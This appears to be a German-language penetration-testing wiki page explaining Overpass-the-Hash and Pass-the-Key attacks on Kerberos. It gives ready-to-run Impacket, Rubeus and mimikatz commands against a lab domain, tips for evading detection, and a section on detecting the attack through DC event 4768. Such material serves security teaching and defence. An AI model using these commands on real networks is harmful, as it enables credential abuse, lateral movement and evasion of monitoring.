# Over Pass the Hash/Pass the Key

{{#include ../../banners/hacktricks-training.md}}


## Overpass The Hash/Pass The Key (PTK)

Der **Overpass The Hash/Pass The Key (PTK)**-Angriff ist für Umgebungen konzipiert, in denen das herkömmliche NTLM-Protokoll eingeschränkt ist und die Kerberos-Authentifizierung Vorrang hat. Dieser Angriff nutzt den NTLM-Hash oder die AES-Schlüssel eines Benutzers, um Kerberos-Tickets anzufordern, wodurch unbefugter Zugriff auf Ressourcen innerhalb eines Netzwerks ermöglicht wird.

Genau genommen:

- **Over-Pass-the-Hash** bezeichnet normalerweise die Umwandlung des **NT-Hashes** in ein Kerberos-TGT über den **RC4-HMAC**-Kerberos-Schlüssel.
- **Pass-the-Key** ist die allgemeinere Variante, bei der bereits ein Kerberos-Schlüssel wie **AES128/AES256** vorhanden ist und damit direkt ein TGT angefordert wird.

Dieser Unterschied ist in gehärteten Umgebungen wichtig: Wenn **RC4 deaktiviert** ist oder vom KDC nicht mehr vorausgesetzt wird, reicht der **NT-Hash allein nicht aus** und du benötigst einen **AES-Schlüssel** (oder das Klartextpasswort, um diesen abzuleiten).

Um diesen Angriff auszuführen, besteht der erste Schritt darin, den NTLM-Hash oder das Passwort des Kontos des Zielbenutzers zu erlangen. Sobald diese Informationen vorliegen, kann ein Ticket Granting Ticket (TGT) für das Konto abgerufen werden, wodurch der Angreifer auf Services oder Computer zugreifen kann, für die der Benutzer Berechtigungen besitzt.

Der Prozess kann mit den folgenden Befehlen gestartet werden:<sup>[[1]](#references)</sup>
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
Für Szenarien, die AES256 erfordern, kann die Option `-aesKey [AES key]` verwendet werden:<sup>[[1]](#references)</sup>
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -aesKey <AES256_HEX>
export KRB5CCNAME=velociraptor.ccache
python wmiexec.py -k -no-pass jurassic.park/velociraptor@labwws02.jurassic.park
```
`getTGT.py` unterstützt außerdem das direkte Anfordern eines **Service-Tickets über eine AS-REQ** mit `-service <SPN>`. Das kann nützlich sein, wenn du ein Ticket für einen bestimmten SPN ohne eine zusätzliche TGS-REQ benötigst:
```bash
python getTGT.py -dc-ip 10.10.10.10 -aesKey <AES256_HEX> -service cifs/labwws02.jurassic.park jurassic.park/velociraptor
```
Darüber hinaus kann das erworbene Ticket mit verschiedenen Tools verwendet werden, einschließlich `smbexec.py` oder `wmiexec.py`, wodurch der Umfang des Angriffs erweitert wird.

Probleme wie _PyAsn1Error_ oder _KDC cannot find the name_ lassen sich typischerweise durch die Aktualisierung der Impacket-Bibliothek oder die Verwendung des Hostnamens anstelle der IP-Adresse beheben, um die Kompatibilität mit dem Kerberos-KDC sicherzustellen.

Eine alternative Befehlssequenz mit Rubeus.exe zeigt einen weiteren Aspekt dieser Technik:<sup>[[1]](#references)</sup>
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
Diese Methode entspricht dem Ansatz **Pass the Key**, konzentriert sich jedoch darauf, das Ticket direkt zu übernehmen und für Authentifizierungszwecke zu verwenden. In der Praxis:

- `Rubeus asktgt` sendet die **rohe Kerberos-AS-REQ/AS-REP** selbst und benötigt keine Administratorrechte, außer wenn du mit `/luid` eine andere Anmeldesitzung anvisieren oder mit `/createnetonly` eine separate erstellen möchtest.
- `mimikatz sekurlsa::pth` schreibt Credential-Material in eine Anmeldesitzung und greift daher auf **LSASS** zu, wofür normalerweise lokale Administratorrechte oder `SYSTEM` erforderlich sind und was aus Sicht eines EDR auffälliger ist.

Beispiele mit Mimikatz:
```bash
sekurlsa::pth /user:velociraptor /domain:jurassic.park /ntlm:2a3de7fe356ee524cc9f3d579f2e0aa7 /run:cmd.exe
sekurlsa::pth /user:velociraptor /domain:jurassic.park /aes256:<AES256_HEX> /run:cmd.exe
```
Um die Operational Security einzuhalten und AES256 zu verwenden, kann der folgende Befehl angewendet werden:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
`/opsec` ist relevant, weil von Rubeus erzeugter Traffic sich geringfügig von nativem Windows-Kerberos unterscheidet. Beachte außerdem, dass `/opsec` für **AES256**-Traffic vorgesehen ist. Die Verwendung mit RC4 erfordert normalerweise `/force`, wodurch ein großer Teil des Zwecks zunichtegemacht wird, da **RC4 in modernen Domains selbst ein starkes Signal ist**.

## Hinweise zur Erkennung

Jede TGT-Anforderung erzeugt auf dem DC das **Event `4768`**. In aktuellen Windows-Builds enthält dieses Event mehr nützliche Felder als in älteren Beschreibungen angegeben:

- `TicketEncryptionType` zeigt, welcher Enctype für das ausgestellte TGT verwendet wurde. Typische Werte sind `0x17` für **RC4-HMAC**, `0x11` für **AES128** und `0x12` für **AES256**.<sup>[[3]](#references)</sup>
- Aktualisierte Events enthalten außerdem `SessionKeyEncryptionType`, `PreAuthEncryptionType` und die vom Client angekündigten Enctypes. Dadurch lässt sich eine **tatsächliche RC4-Abhängigkeit** besser von verwirrenden Legacy-Defaults unterscheiden.
- Das Auftreten von `0x17` in einer modernen Umgebung ist ein guter Hinweis darauf, dass der Account, der Host oder der KDC-Fallback-Pfad weiterhin RC4 zulässt und daher für NT-Hash-basiertes Over-Pass-the-Hash empfänglicher ist.

Microsoft reduziert das Verhalten „RC4 by default“ seit den Kerberos-Hardening-Updates vom November 2022 schrittweise. Die aktuelle veröffentlichte Empfehlung lautet, **RC4 bis zum Ende des zweiten Quartals 2026 als standardmäßig angenommenen Enctype für AD-DCs zu entfernen**. Aus offensiver Sicht bedeutet das, dass **Pass-the-Key mit AES** zunehmend der zuverlässige Weg ist, während klassisches **NT-hash-only OpTH** in gehärteten Umgebungen immer häufiger fehlschlagen wird.<sup>[[3]](#references)</sup>

Weitere Informationen zu Kerberos-Verschlüsselungstypen und dem damit verbundenen Ticketing-Verhalten findest du hier:

{{#ref}}
kerberos-authentication.md
{{#endref}}

## Unauffälligere Variante

> [!WARNING]
> Jede Logon-Session kann immer nur ein aktives TGT haben. Sei daher vorsichtig.

1. Erstelle mit **`make_token`** aus Cobalt Strike eine neue Logon-Session.
2. Verwende anschließend Rubeus, um ein TGT für die neue Logon-Session zu erzeugen, ohne die bestehende zu beeinflussen.

Eine ähnliche Isolation kannst du direkt mit Rubeus über eine temporäre **Logon-Type-9**-Session erreichen:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES256_HEX> /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
Dies verhindert das Überschreiben des TGT der aktuellen Sitzung und ist normalerweise sicherer, als das Ticket in die bestehende Logon-Sitzung zu importieren.

## References

- [1] [Tarlogic - Kerberos (II): ¿Cómo atacar Kerberos?](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)
- [2] [GhostPack - Rubeus (GitHub repository)](https://github.com/GhostPack/Rubeus)
- [3] [Microsoft Learn - Detect and Remediate RC4 Usage in Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)

{{#include ../../banners/hacktricks-training.md}}
